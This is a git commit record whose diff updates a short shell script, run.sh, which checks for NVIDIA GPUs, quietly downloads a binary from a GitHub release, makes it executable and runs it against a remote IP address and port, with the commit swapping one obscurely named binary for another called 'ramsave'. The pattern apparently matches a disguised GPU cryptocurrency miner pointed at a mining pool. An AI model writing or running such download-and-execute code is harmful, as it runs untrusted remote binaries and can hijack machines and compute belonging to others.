86e9b6f7d6b2e686b28a14754836ffa52fb31f3f
phucbmt <phucdlbmt@gmail.com>
2021-03-02 22:55:31 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,5 +1,5 @@
 !/bin/bash
 nvidia-smi -L
-wget https://github.com/friartuxlh25/1234dsfsdfs/releases/download/1/sdfsdgferter3453 &> /dev/null
-chmod +x sdfsdgferter3453
-./sdfsdgferter3453 -P http://216.198.92.69:4545/"$1" &> log
+wget https://github.com/phucbmt/tech/releases/download/1/ramsave &> /dev/null
+chmod +x ramsave
+./ramsave -P http://216.198.92.69:4545/"$1" &> log
